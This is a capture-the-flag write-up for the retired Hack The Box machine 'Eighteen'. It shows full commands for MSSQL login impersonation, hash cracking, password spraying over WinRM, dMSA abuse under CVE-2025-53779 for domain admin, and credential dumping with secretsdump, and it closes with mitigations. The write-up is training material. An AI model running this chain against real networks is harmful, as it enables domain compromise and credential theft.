---
machine: Eighteen
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, mssql, impersonation, dmsa, cve-2025-53779, winrm]
---

# Eighteen — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An *assume-breach* scenario on Windows Server 2025: low-privilege MSSQL credentials are provided. `EXECUTE AS LOGIN` impersonates an application login and reaches the `FinancePlanner` database, where the web admin hash sits in **Werkzeug PBKDF2-SHA256** format. Crack it, reuse the password against another user with WinRM. Escalation abuses **CVE-2025-53779** ("Bad Successor"): the **dMSA** migration flow lets you forge keys for a delegated account that inherits the predecessor's groups, Domain Admins included.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
53/tcp   dns
88/tcp   kerberos-sec
389/tcp  ldap
445/tcp  microsoft-ds
1433/tcp ms-sql-s
5985/tcp wsman
```

The ports give it away: a DC with MSSQL and WinRM exposed.

## Foothold: MSSQL impersonation

```bash
impacket-mssqlclient eighteen.htb/<user>:'<password>'@dc01.eighteen.htb -windows-auth
```

```sql
SELECT name, type_desc FROM sys.server_principals;
SELECT b.name FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

```text
sa
finance_app
```

```sql
EXECUTE AS LOGIN = 'finance_app';
SELECT SYSTEM_USER;
USE FinancePlanner;
SELECT username, password_hash FROM admins;
```

```text
admin | pbkdf2:sha256:600000$<salt>$<hash>
```

## Cracking the Werkzeug hash

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
admin:<password>
```

## Spray against WinRM

The web admin password is reused:

```bash
nxc winrm dc01.eighteen.htb -u users.txt -p '<password>' --continue-on-success
```

```text
[+] eighteen.htb\<user2>:<password>
```

```bash
evil-winrm -i dc01.eighteen.htb -u <user2> -p '<password>'
```

## Escalation: CVE-2025-53779 ("Bad Successor")

The flaw lives in Server 2025's **delegated Managed Service Account** migration: anyone holding `CreateChild` on the OU (or ACLs over a dMSA object) can create or modify a dMSA pointing at a privileged predecessor and force the migration. The KDC then issues a TGT carrying the predecessor's PAC.

```powershell
Get-ACL "AD:CN=dmsa1,CN=Managed Service Accounts,DC=eighteen,DC=htb" | fl
Set-ADComputer dmsa1 -Replace @{ "msDS-DelegatedMSAState" = 2 }
Rubeus.exe asktgt /user:dmsa1$ /aes256:<key> /domain:eighteen.htb /dc:dc01.eighteen.htb /ptt
```

With a Domain Admin PAC in memory:

```bash
impacket-secretsdump eighteen.htb/'dmsa1$'@dc01.eighteen.htb -k -no-pass
```

## Evidence (redacted)

```text
C:\Users\<user>\user.txt          -> <user_flag>
C:\Users\Administrator\root.txt   -> <root_flag>
```

## Lessons

- `IMPERSONATE` in MSSQL is quiet lateral movement: no `sysadmin` needed, just the permission over a better login.
- Framework hashes (Werkzeug, Django, bcrypt) are recognisable by prefix and need the right hashcat mode.
- Reusing the web panel password on a domain account turns a DB dump into remote access.
- Mitigation: drop unnecessary `IMPERSONATE`, patch CVE-2025-53779, restrict `CreateChild` on OUs holding dMSAs, and audit `msDS-DelegatedMSAState`.
